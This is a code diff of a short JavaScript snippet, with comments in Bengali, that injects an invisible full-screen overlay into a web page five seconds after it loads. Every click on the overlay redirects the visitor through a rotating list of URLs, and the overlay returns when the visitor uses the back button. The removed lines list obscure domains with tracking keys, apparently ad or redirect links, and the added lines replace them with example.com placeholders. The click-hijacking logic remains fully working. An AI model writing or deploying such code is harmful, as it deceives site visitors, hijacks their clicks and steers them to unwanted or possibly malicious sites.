@@ -1,46 +1,44 @@
 // তিনটি URL
 const redirectLinks = [
-  "https://nickeldefiancepriest.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af",
-  "https://pairturnnumerous.com/rze4wd8aa?key=74d74ecf1cacbe96436ceb718716741c",
-  "https://villagetraitgarret.com/fz3ifw9n?key=255cb9b54aebe1dca0f89408b47e3fcf"
+  "https://example.com/1",
+  "https://example.com/2",
+  "https://example.com/3"
 ];
 
 let currentIndex = 0; // কোন URL-এ যাবে ট্র্যাকের জন্য
-const popup = document.createElement("div");
 
-// Overlay CSS
+// Create the popup overlay dynamically
+const popup = document.createElement("div");
 popup.id = "popupOverlay";
 popup.style.position = "fixed";
 popup.style.top = "0";
 popup.style.left = "0";
 popup.style.width = "100%";
 popup.style.height = "100%";
-
+popup.style.background = "rgba(0,0,0,0.0)";
 popup.style.display = "none";
 popup.style.zIndex = "9999";
 popup.style.cursor = "pointer";
-
 document.body.appendChild(popup);
 
-// Function to show popup after 5s
 function showPopup() {
   setTimeout(() => {
     popup.style.display = "block";
   }, 5000);
 }
 
-showPopup();
+showPopup(); // পেজ লোডে প্রথমবার popup দেখাবে
 
 popup.addEventListener("click", function() {
   const nextLink = redirectLinks[currentIndex];
-  currentIndex = (currentIndex + 1) % redirectLinks.length;
+  currentIndex = (currentIndex + 1) % redirectLinks.length; // serially loop
   popup.style.display = "none";
   window.location.href = nextLink;
 });
 
-// Back button
+// Back button এ popup আবার দেখানোর জন্য
 window.addEventListener("pageshow", function(event) {
-  if (event.persisted) {
+  if(event.persisted) {
     showPopup();
   }
 });
